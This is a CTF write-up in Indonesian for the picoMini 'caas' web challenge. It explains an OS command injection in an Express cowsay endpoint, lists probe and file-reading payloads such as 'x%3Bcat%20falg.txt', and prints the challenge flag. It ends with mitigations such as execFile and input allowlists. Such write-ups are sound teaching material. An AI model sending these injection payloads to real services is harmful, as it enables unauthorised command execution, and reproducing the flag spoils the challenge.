# caas (Challenge 202, Web Exploitation)

- **ID:** 202 | **Event:** picoMini by redpwn | **Kategori:** Web Exploitation / OS Command Injection | **Level:** Medium
- **Flag:** `picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}` (terverifikasi live `POST /api/submissions/` -> `correct: true`; format `picoCTF{...}` asli event, bukan `academy{...}`)

## Skenario
`index.js` (Express) mengekspos `GET /cowsay/:message`, meneruskan parameter langsung ke shell: `exec('/usr/games/cowsay ' + message)`. Lab live di `https://caas.mars.cylabacademy.net`. Direktori kerja `/app` berisi `falg.txt` (typo disengaja), `index.js`, `Dockerfile`.

## Root Cause
Interpolasi string ke `child_process.exec` tanpa sanitasi = OS Command Injection (CWE-78). Karakter `;` memutus perintah cowsay dan mengeksekusi perintah arbitrary sebagai user `node`. Referensi: NIST SP 800-115 (input validation testing), OWASP A03 Injection.

## Rekonstruksi
1. Unduh `index.js`, identifikasi sink `exec()` dengan template literal.
2. Probe: `GET /cowsay/hi%3Bpwd` -> output cowsay + `/app`; `GET /cowsay/hi%3Bls` -> `Dockerfile, falg.txt, index.js, node_modules`; `a%3Bid` -> `uid=1000(node)`.
3. Eksfiltrasi: `GET /cowsay/x%3Bcat%20falg.txt` -> `picoCTF{mooo...0o}`.
   Otomasi: `python3 scripts/solve_202_caas.py`.
4. Submit `POST /api/submissions/` -> `correct: true` (live 2026-10-30).

## Mitigasi
Jangan bangun perintah shell dari input user. Gunakan `execFile('/usr/games/cowsay', [message])` (tanpa shell) atau allowlist charset `^[A-Za-z0-9 ]+$`. Terapkan least-privilege user dan read-only filesystem pada container.

## Takeaway LKS
Klasifikasi Web: audit sumber-sink (taint analysis) -> uji separator shell (`;`, `|`, `$()`) -> eksfiltrasi file. Relevan defensif: pemisahan code-vs-data, parameterized execution, dan output encoding.
